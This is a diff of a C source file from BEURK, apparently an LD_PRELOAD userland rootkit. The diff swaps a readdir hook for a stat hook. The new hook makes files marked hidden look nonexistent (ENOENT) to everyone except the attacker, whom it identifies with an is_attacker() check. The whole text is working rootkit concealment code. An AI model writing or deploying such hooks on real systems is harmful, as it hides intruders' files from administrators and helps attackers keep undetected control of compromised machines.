@@ -18,24 +18,22 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <dirent.h> /* struct dirent, DIR */
-#include <string.h> /* strcmp() */
-#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
-#include "config.h" /* REAL_READDIR() */
+#include <sys/stat.h> /* struct stat */
+#include <errno.h> /* errno, ENOENT */
+#include "beurk.h" /* is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_STAT() */
 #include "hooks.h" /* prototype */
 
-struct dirent   *readdir(DIR *dirp) {
-    DEBUG(D_INFO, "called readdir(3) hook");
-
-    struct dirent   *dir;
-
-    dir = REAL_READDIR(dirp);
+int __xstat(int __ver, const char *__filename, struct stat *buf) {
+    DEBUG(D_INFO, "called stat(2) hook");
 
     if (is_attacker())
-        return (dir);
+        return (REAL___XSTAT(__ver, __filename, buf));
 
-    while (dir && strcmp(dir->d_name, ".") && is_hidden_file(dir->d_name)) {
-        dir = REAL_READDIR(dirp);
+    if (is_hidden_file(__filename)) {
+        errno = ENOENT;
+        return (-1);
     }
-    return (dir);
+
+    return (REAL___XSTAT(__ver, __filename, buf));
 }
